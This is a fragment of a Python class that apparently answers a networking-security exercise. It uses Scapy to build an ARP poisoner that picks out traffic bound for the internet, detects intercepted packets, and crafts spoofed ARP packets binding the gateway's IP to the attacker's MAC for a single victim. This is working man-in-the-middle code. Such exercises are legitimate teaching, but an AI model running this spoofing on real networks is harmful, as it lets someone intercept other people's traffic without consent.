...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet):
        ...
        """
        # check if the destionation ip is inside our local network
        dst_ip_split = packet[S.IP].dst.split(".")
        to_inner_add = dst_ip_split[0] == '10' and dst_ip_split[1] == '0' and dst_ip_split[2] == '2'
        # return true for every packet destained outside to the global internet and wasn't sent from our ip
        return not to_inner_add and not packet[S.IP].src == self.our_ip
    ...
    def is_stolen_packet(self, packet):
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        # Packet originaly destained to us will have also our ip address
        # If the ip address it different - its a stolen packet
        return packet[S.Ether].dst == self.our_mac and packet[S.IP].dst != self.our_ip
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        # craft a matching ARP response
        # the "source ip" is the gateway router ip but the source MAC address is our MAC address
        arp = S.ARP(hwtype=0x1, ptype=0x800, hwlen=6, plen=4, op='who-has', psrc=self.gateway_ip, hwsrc=self.our_mac, pdst=victim_packet[S.IP].src)
        return arp
